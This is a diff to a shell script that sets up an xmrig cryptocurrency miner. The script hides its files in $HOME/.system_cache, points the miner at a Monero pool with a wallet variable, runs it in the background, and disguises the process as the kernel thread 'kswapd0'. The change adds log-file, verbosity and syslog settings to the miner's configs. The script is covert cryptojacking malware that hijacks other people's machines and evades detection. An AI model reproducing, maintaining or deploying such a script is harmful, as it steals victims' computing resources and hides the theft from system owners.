@@ -343,6 +343,7 @@ else
 fi
 echo ""
 
+# Original config modifications
 sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.system_cache/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
@@ -354,6 +355,30 @@ sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_c
 
 cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json
+
+# ==================== ENABLE XMRIG LOGGING ====================
+echo "[*] Enabling xmrig logging for monitoring..."
+
+# Enable log file (change from /dev/null to actual log file)
+sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/miner.log",#' $HOME/.system_cache/config.json
+sed -i 's#"log-file": *"[^"]*",#"log-file": "'$HOME'/.system_cache/miner.log",#' $HOME/.system_cache/config_background.json
+
+# Set verbose logging level (0=quiet, 2=normal, 4=debug)
+sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config.json
+sed -i 's/"verbose": *[^,]*,/"verbose": 2,/' $HOME/.system_cache/config_background.json
+
+# Enable syslog
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.system_cache/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.system_cache/config_background.json
+
+# Also set in the background config
+cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json
+
+echo "[✓] Miner logging enabled: $HOME/.system_cache/miner.log"
+# ==============================================================
+
+# Continue with existing script...
 #cat $HOME/.system_cache/config.json
 
 # Run kswapd0 if no other process with the specific configuration is running
